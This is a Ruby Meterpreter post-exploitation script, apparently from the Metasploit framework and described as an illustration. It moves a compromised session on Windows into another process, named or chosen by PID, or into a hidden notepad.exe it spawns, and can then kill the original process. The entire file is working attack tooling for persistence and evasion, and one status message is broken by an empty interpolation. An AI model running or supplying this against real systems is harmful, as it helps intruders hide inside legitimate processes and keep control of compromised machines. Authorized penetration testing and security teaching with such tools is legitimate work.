#
# Simple example script that migrates to a specific process by name.
# This is meant as an illustration.
#


spawn = false
kill = false
target_pid = nil
target_name = nil

opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu." ],
  "-f" => [ false, "Launch a process and migrate into the new process"],
  "-p" => [ true , "PID to migrate to."],
  "-k" => [ false, "Kill original process."],
  "-n" => [ true, "Migrate into the first process with this executable name (explorer.exe)" ]
)

opts.parse(args) { |opt, idx, val|
  case opt
  when "-f"
    spawn = true
  when "-k"
    kill = true
  when "-p"
    target_pid = val.to_i
  when "-n"
    target_name = val.to_s
  when "-h"
    print_line(opts.usage)
    raise Rex::Script::Completed
  else
    print_line(opts.usage)
    raise Rex::Script::Completed
  end
}

# Creates a temp notepad.exe to migrate to depending the architecture.
def create_temp_proc()
  # Use the system path for executable to run
  cmd = "notepad.exe"
  # run hidden
  proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
  return proc.pid
end

# In case no option is provided show help
if args.length == 0
  print_line(opts.usage)
  raise Rex::Script::Completed
end

### Main ###

if client.platform =~ /win32|win64/
  server = client.sys.process.open
  original_pid = server.pid
  print_status("Current server process: #{server.name} (#{server.pid})")

  if spawn
    print_status("Spawning notepad.exe process to migrate to")
    target_pid = create_temp_proc
  end

  if target_name and not target_pid
    target_pid = client.sys.process[target_name]
    if not target_pid
      print_status("Could not identify the process ID for #{target_name}")
      raise Rex::Script::Completed
    end
  end

  begin
    print_good("Migrating to #{target_pid}")
    client.core.migrate(target_pid)
    print_good("Successfully migrated to process #{}")
  rescue ::Exception => e
    print_error("Could not migrate in to process.")
    print_error(e)
  end

  if kill
    print_status("Killing original process with PID #{original_pid}")
    client.sys.process.kill(original_pid)
    print_good("Successfully killed process with PID #{original_pid}")
  end
end
